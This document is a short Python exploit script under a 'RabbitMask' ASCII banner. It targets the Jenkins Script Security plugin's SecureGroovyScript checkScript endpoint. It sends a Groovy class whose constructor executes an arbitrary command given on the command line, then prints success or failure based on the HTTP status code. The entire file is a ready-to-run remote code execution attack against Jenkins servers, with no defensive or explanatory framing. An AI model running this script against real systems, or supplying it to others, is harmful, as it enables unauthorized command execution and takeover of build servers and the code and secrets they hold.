#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
'''
import requests,sys

def run(url,cmd):
    s = "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript"
    data = {"sandbox":"true","value":f'''public class x {{public x(){{"{cmd}".execute()}}}}'''}
    r = requests.get(f"{url}{s}",params=data)
    print(f"status_code:{r.status_code}")
    return r.status_code


if __name__ == "__main__":
    res=run(sys.argv[1],sys.argv[2])
    if res==200:
        print("success!")
    else:
        print("fail!")